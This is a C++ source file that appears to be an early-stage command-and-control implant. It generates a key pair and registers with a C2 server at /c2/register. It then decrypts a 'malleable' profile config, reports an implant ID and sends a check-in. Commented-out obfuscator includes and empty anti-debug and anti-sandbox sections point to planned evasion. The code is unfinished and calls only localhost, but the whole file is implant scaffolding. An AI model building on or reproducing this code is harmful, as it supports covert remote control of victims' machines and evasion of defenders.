#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
#include <sodium.h>
#include <string.h>
#include <vector>
// #include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "crypto.h"
#include "httpclient.h"
#include "profile.h"

using namespace std;
//using namespace andrivet::ADVobfuscator;

#ifndef DEBUG
#define DEBUG 0
#endif

#define CONTENT_TYPE_JSON L"Content-Type: application/json"

MalleableProfile* currentProfile;

std::string LPBYTEToString(LPBYTE bytes, size_t length)
{
	return std::string(reinterpret_cast<char*>(bytes), reinterpret_cast<char*>(bytes + length));
}

size_t GetLPBYTELength(LPBYTE bytes)
{
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery(bytes, &mbi, sizeof(mbi));
	return mbi.RegionSize;
}

int main()
{
	if (sodium_init() < 0) {
		return 1;
	}

	// Anti Debug

	// Anti Sandbox

	string privKey;
	string pubKey;
	int status = createBase64KeyPair(&privKey, &pubKey);

	if (status != 0) {
		cout << "Error creating key pair, aborting" << endl;
		exit(1);
	}

	rapidjson::Document registerDocument;
	registerDocument.SetObject();
	rapidjson::Document::AllocatorType& allocator = registerDocument.GetAllocator();
	rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
	registerDocument.AddMember("txid", pubKeyVal, allocator);


	rapidjson::StringBuffer buffer;
	rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
	registerDocument.Accept(writer);
	const char* key_json = buffer.GetString();

	PSIZE_T outSize = 0;

	// Register
	string res = HTTPRequest(L"POST", L"localhost", L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
	//string res_str = LPBYTEToString(res, GetLPBYTELength(res));
	cout << "Received:" << endl;
	cout << res << endl;
	//cout << res_str << endl;
	rapidjson::Document resDocument;
	resDocument.Parse(res.c_str());
	cout << "status: " << resDocument["status"].GetBool() << endl;
	cout << "Config: " << endl;

	const rapidjson::Value& c = resDocument["c"];
	string c_str = c.GetString();
	string cDecoded = base64DecodeToString(c_str);
	string b64ServerPubKey = resDocument["k"].GetString();

	// We still need to decrypt the config
	string decryptedConfig = decryptB64String(b64ServerPubKey, privKey, c_str);
	
	cout << decryptedConfig << endl;

	currentProfile = parseMalleableConfig(decryptedConfig, privKey);

	cout << "Implant ID: " << currentProfile->implantId << endl;

	// // do stuff with the response
	Sleep(1);
	// // Checkin loop
	string checkinRes = HTTPRequest(L"POST", L"localhost", L"/c2/checkin", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
	rapidjson::Document document;
	const char* answer_str = "{\"hello\": \"world\"}";
	document.Parse(answer_str);
	printf("hello = %s\n", document["hello"].GetString());
	return 0;
}


